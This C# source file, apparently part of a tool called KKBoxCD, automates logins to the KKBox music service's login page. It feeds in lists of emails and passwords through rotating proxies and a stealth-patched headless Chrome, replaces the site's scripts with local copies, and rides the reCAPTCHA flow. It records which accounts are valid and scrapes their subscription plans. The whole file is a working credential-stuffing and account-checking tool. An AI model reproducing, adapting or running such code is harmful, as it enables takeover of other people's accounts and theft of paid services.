using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using KKBoxCD.Core.Manager;
using KKBoxCD.Core.Support;
using KKBoxCD.Core.Utils;
using PuppeteerExtraSharp;
using PuppeteerExtraSharp.Plugins.ExtraStealth;
using PuppeteerSharp;

namespace KKBoxCD.Core
{
    public class AutoThread
    {
        private readonly Config mConfig;
        private readonly AccountManager mAccountManager;
        private readonly ProxyManager mProxyManager;

        #region Properties Variable

        public int ThreadID { get; private set; }

        public Account Account;

        public Proxy Proxy;

        public Browser Browser { get; private set; }

        public Page Page { get; private set; }

        public PageCTL PageCTL { get; private set; }

        #endregion

        public AutoThread(int thread_id)
        {
            ThreadID = thread_id;
            mConfig = Config.Instance;
            mAccountManager = AccountManager.Instance;
            mProxyManager = ProxyManager.Instance;
        }

        #region Operating Function

        public void Start()
        {
            Thread thread = new Thread(Work)
            {
                Name = "AutoThread"
            };
            thread.Start();
        }

        private void Log(string content)
        {
            if (mConfig.IsDebug)
            {
                Console.WriteLine("[THREAD_{0}] {1}", ThreadID, content);
            }
        }

        #endregion

        #region Work Function

        private void Work()
        {
            while (true)
            {
                try
                {
                    Log(">> Lấy Proxy");
                    Proxy = mProxyManager.Random();
                    if (Proxy == null)
                    {
                        Log("Đã hết Proxy");
                        break;
                    }

                    Log(">> Kiểm tra lượng tài khoản");
                    if (mAccountManager.IsEmpty())
                    {
                        Log("Đã hết Account");
                        break;
                    }

                    Log(">> Khởi tạo tham số Browser");
                    List<string> args = new List<string>()
                    {
                        $"--app=\"data:text/html,<title></title>\"",
                        "--allow-cross-origin-auth-prompt",
                        "--disable-web-security",
                        "--disable-sync",
                        "--disable-translate",
                        "--disable-backgrounding-occluded-windows",
                        "--disable-background-networking",
                        "--disable-client-side-phishing-detection",
                        "--disable-dev-shm-usage",
                        "--disable-breakpad",
                        "--disable-domain-reliability",
                        "--disable-features=HardwareMediaKeyHandling,OmniboxUIExperimentHideSteadyStateUrlPathQueryAndRef,OmniboxUIExperimentHideSteadyStateUrlScheme,OmniboxUIExperimentHideSteadyStateUrlTrivialSubdomains,ShowManagedUi",
                        "--disable-hang-monitor",
                        "--disable-ipc-flooding-protection",
                        "--disable-notifications",
                        "--disable-offer-store-unmasked-wallet-cards",
                        "--disable-popup-blocking",
                        "--disable-print-preview",
                        "--disable-prompt-on-repost",
                        "--disable-remote-fonts",
                        "--disable-default-apps",
                        "--disable-image-loading",
                        "--disable-speech-api",
                        "--hide-scrollbars",
                        "--ignore-certificate-errors",
                        "--ignore-gpu-blacklist",
                        "--metrics-recording-only",
                        "--no-default-browser-check",
                        "--no-first-run",
                        "--no-pings",
                        "--no-sandbox",
                        "--no-zygote",
                        "--disable-gpu",
                        "--password-store=basic",
                        "--reset-variation-state",
                        "--use-mock-keychain",
                    };
                    if (mConfig.IsSocks)
                    {
                        args.Add($"--proxy-server=\"socks5://{Proxy.Address}:{Proxy.Port}\"");
                        args.Add($"--host-resolver-rules=\"MAP * 0.0.0.0, EXCLUDE {Proxy.Address}\"");
                    }
                    else
                    {
                        args.Add($"--proxy-server=\"{Proxy.Address}:{Proxy.Port}\"");
                    }

                    Log(">> Khởi tạo Browser và Page");
                    PuppeteerExtra extra = new PuppeteerExtra();
                    LaunchOptions options = new LaunchOptions()
                    {
                        Headless = !mConfig.IsDebug,
                        ExecutablePath = Consts.ChromeFile,
                        Args = args.ToArray()
                    };
                    Browser = extra.Use(new StealthPlugin()).LaunchAsync(options).Result;
                    Page = Browser.PagesAsync().Result[0];
                    PageCTL = new PageCTL(Page);

                    Log(">> Ghi đè Request");
                    Page.SetRequestInterceptionAsync(true).Wait();
                    Page.Request += OnRequest;

                    bool success = false;
                    int loop = mConfig.TimesPerBrowser;
                    while (loop > 0)
                    {
                        Log(">> Lấy Account");
                        Account = mAccountManager.Get();
                        if (Account == null)
                        {
                            Log("Đã hết Account");
                            throw new Exception("Đã hết Account");
                        }

                        Stopwatch watch = new Stopwatch();
                        watch.Start();

                        Log(">> Truy cập trang");
                        if (!Page.Url.StartsWith("https://kkid.kkbox.com/login"))
                        {
                            success = PageCTL.GoToAsync("https://kkid.kkbox.com/login", "#recaptcha", new NavigationOptions
                            {
                                Timeout = mConfig.PageTimeout,
                                WaitUntil = new WaitUntilNavigation[]
                                {
                                    WaitUntilNavigation.DOMContentLoaded
                                }
                            }).Result;
                            if (!success)
                            {
                                throw new Exception("Truy cập trang thất bại");
                            }
                        }

                        Log(">> Đợi Recaptcha sẵn sàng");
                        success = WaitRecaptcha(mConfig.PageTimeout);
                        if (!success)
                        {
                            throw new Exception("Đợi Recaptcha thất bại");
                        }

                        Log(">> Dừng tải trang");
                        Thread.Sleep(250);
                        PageCTL.StopLoadingAsync().Wait();

                        watch.Stop();
                        Console.WriteLine("Ready: {0}ms", watch.ElapsedMilliseconds);
                        //Thread.Sleep(99999999);

                        Log(">> Gửi lệnh đăng nhập");
                        Thread.Sleep(250);
                        try
                        {
                            Page.EvaluateFunctionAsync(@"
                            (username, password) => {
                                window.__username = username;
                                window.__password = password;

                                const toast_content = document.querySelector('#toast-content');
                                if (toast_content != null) {
                                    toast_content.remove();
                                }

                                challenge();
                            }", Account.Email, Account.Password).Wait();
                        }
                        catch
                        {
                            throw new Exception("Gửi lệnh đăng nhập thất bại");
                        }

                        Log(">> Đợi chuyển hướng");
                        success = PageCTL.WaitForExistAnyAsync(new string[]
                        {
                            "#logout",
                            "#toast-content",
                            ".server_prompt"
                        }, mConfig.PageTimeout).Result;
                        if (!success)
                        {
                            throw new Exception("Đợi kết quả đăng nhập thất bại");
                        }

                        Log(">> Kiểm tra đăng nhập");
                        Thread.Sleep(250);
                        if (PageCTL.ExistAsync("#logout").Result)
                        {
                            Log(">> Lấy trạng thái");
                            Thread.Sleep(250);
                            try
                            {
                                Account.Plan = Page.EvaluateFunctionAsync<string>(@"
                                () => {
                                    try {
                                        const xhr = new XMLHttpRequest();
                                        xhr.open('GET', '/plan', false);
                                        xhr.send();
                                        document.body.outerHTML = xhr.responseText;

                                        const no_plan = document.querySelector('.no_plan');
                                        if (no_plan != null) {
                                            return 'No Plan';
                                        }

                                        const card = document.querySelector('.plan_card');
                                        const data = card.innerText.split('\n');

                                        var plan = '';
                                        if (data.length > 0) {
                                            plan += data[0] + ' | ';
                                        }
                                        if (data.length > 1) {
                                            plan += data[1] + ' | ';
                                        }
                                        if (data.length > 4) {
                                            plan += data[4] + ' | ';
                                        }
                                        if (data.length > 12) {
                                            plan += data[12];
                                        }
                                        return plan;
                                
                                    } catch {
                                        return 'Get Failed';
                                    }
                                }").Result;
                            }
                            catch
                            {
                                Account.Plan = "Get Failed";
                            }

                            Log(">> Ghi kết quả");
                            Account.Status = AccountStatus.Perfect;
                            mAccountManager.Write(Account);
                            Account = null;
                            States.Perfect++;
                            break;
                        }
                        else if (PageCTL.ExistAsync("#toast-content").Result)
                        {
                            Log(">> Đọc mã lỗi");
                            string error_content;
                            try
                            {
                                error_content = PageCTL.GetElementInnerText("#toast-content").Result;
                            }
                            catch
                            {
                                error_content = string.Empty;
                            }

                            Log(">> Phân loại lỗi");
                            if (error_content.Equals("not_verified"))
                            {
                                Log(">> Ghi kết quả");
                                Account.Status = AccountStatus.NotExist;
                                mAccountManager.Write(Account);
                                Account = null;
                                States.NotExist++;
                            }
                            else if (error_content.Equals("login_failed"))
                            {
                                Log(">> Ghi kết quả");
                                Account.Status = AccountStatus.Wrong;
                                mAccountManager.Write(Account);
                                Account = null;
                                States.Wrong++;
                            }
                            else
                            {
                                throw new Exception("Phân loại lỗi ngoại lệ");
                            }
                        }
                        else if (PageCTL.ExistAsync(".server_prompt").Result)
                        {
                            Log(">> Ghi kết quả");
                            Account.Status = AccountStatus.LoginFail;
                            mAccountManager.Write(Account);
                            Account = null;
                            States.LoginFail++;
                        }
                        else
                        {
                            throw new Exception("Kiểm tra đăng nhập thất bại");
                        }
                        loop--;
                    }
                }
                catch (Exception ex)
                {
                    Log($">> Lỗi phát sinh: {ex}");
                }
                finally
                {
                    Log(">> Dọn dẹp tài nguyên");

                    if (Account != null)
                    {
                        mAccountManager.Push(Account);
                        Account = null;
                    }
                    if (Proxy != null)
                    {
                        Proxy = null;
                    }
                    if (Page != null)
                    {
                        try
                        {
                            Page.CloseAsync().Wait();
                            Page.Dispose();
                        }
                        catch { }
                        Page = null;
                    }
                    if (Browser != null)
                    {
                        try
                        {
                            Browser.CloseAsync().Wait();
                            Browser.Dispose();
                        }
                        catch { }
                        Browser = null;
                    }

                    GC.Collect();
                }
            }
        }

        private bool WaitRecaptcha(int times = 15000)
        {
            while (times > 0)
            {
                try
                {
                    bool success = Page.EvaluateFunctionAsync<bool>(@"
                    () => {
                        try {
                            return document.querySelector('#recaptcha').value.length > 0;
                        }
                        catch {
                            return false;
                        }
                    }").Result;

                    if (success)
                    {
                        return true;
                    }
                }
                catch { }

                times -= 1000;
                Thread.Sleep(1000);
            }
            return false;
        }

        private async void OnRequest(object sender, RequestEventArgs e)
        {
            Request req = e.Request;
            ResourceType type = req.ResourceType;
            ResourceType[] blocks = new ResourceType[]
            {
                ResourceType.Image,
                ResourceType.Img,
                ResourceType.Font,
                ResourceType.StyleSheet
            };

            if (blocks.Contains(type))
            {
                await req.RespondAsync(new ResponseData
                {
                    ContentType = string.Empty,
                    BodyData = new byte[0],
                    Status = HttpStatusCode.OK,
                });
            }
            else if (type == ResourceType.Script)
            {
                string name = Path.GetFileName(req.Url);
                byte[] bytes = SourceManager.Get(name);
                if (bytes != null)
                {
                    await req.RespondAsync(new ResponseData
                    {
                        ContentType = "text/javascript; charset=utf-8",
                        BodyData = bytes,
                        Status = HttpStatusCode.OK,
                    });
                }
                else
                {
                    await req.ContinueAsync();
                }
            }
            else
            {
                await req.ContinueAsync();
            }
        }

        #endregion
    }
}